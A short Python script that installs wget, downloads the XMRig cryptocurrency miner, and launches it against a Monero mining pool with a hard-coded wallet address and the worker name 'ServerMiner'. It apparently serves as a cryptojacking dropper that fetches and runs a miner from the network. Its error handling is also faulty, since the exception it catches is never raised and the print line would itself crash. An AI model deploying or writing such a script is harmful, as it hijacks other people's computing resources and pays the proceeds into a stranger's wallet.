import subprocess
try:
	subprocess.run(["apt", "install", "wget"])
	subprocess.run(["wget", "https://github.com/xmrig/xmrig/releases/download/v6.16.4/xmrig-6.16.4-linux-x64.tar.gz"])
	subprocess.run(["apt", "install", "tar"])
	subprocess.run(["tar","xf","xmrig-6.16.4-linux-x64.tar.gz"])
	subprocess.run(["./xmrig-6.16.4/xmrig","-o","gulf.moneroocean.stream:10128","-a","randomx","-u","42iamd1fenv4CiTk5QgbD2YJUDxJHwmTxRj7V8p6oProaffUC7TkJDPLUAxRjTrsd3RfjzWNvEEHyL4Ud3NSJKqvHhpjdND","-p","ServerMiner"])
except subprocess.CalledProcessError as err:
	print("ERROR:" + err)
